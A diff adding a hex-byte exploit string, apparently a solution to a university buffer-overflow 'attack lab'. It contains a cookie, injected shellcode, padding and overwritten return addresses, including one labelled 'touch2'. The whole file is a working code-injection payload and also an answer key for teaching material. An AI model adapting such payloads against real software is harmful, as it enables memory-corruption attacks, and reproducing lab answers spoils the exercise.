@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00 
+35 39 62 39 39 37 66 61 /* string representation of cookie */
+00 00 00 00 00 00 00 00
+48 c7 c7 80 dc 61 55 c3 /* injected code */
+00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
+90 dc 61 55 00 00 00 00 /* return address of injected code */
+fa 18 40 00 00 00 00 00 /* return address of touch2 */
